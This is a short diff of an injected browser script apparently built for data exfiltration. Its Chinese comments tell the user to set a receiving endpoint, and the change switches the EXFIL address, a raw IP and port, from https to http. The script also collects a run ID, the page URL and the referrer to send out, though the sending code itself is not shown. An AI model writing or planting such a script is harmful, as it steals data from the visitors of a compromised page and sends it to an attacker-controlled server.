@@ -5,7 +5,7 @@
 <script>
 (function() {
     // 配置你的接收端（必须支持接收 POST 请求，例如 beeceptor 或你的服务器）
-    const EXFIL = "https://8.153.202.232:2222";  // 替换成你的外带地址
+    const EXFIL = "http://8.153.202.232:2222";  // 替换成你的外带地址
     const RUN_ID = Math.random().toString(36).substring(2) + Date.now();
     const LOC = encodeURIComponent(location.href);
     const REF = encodeURIComponent(document.referrer || "");
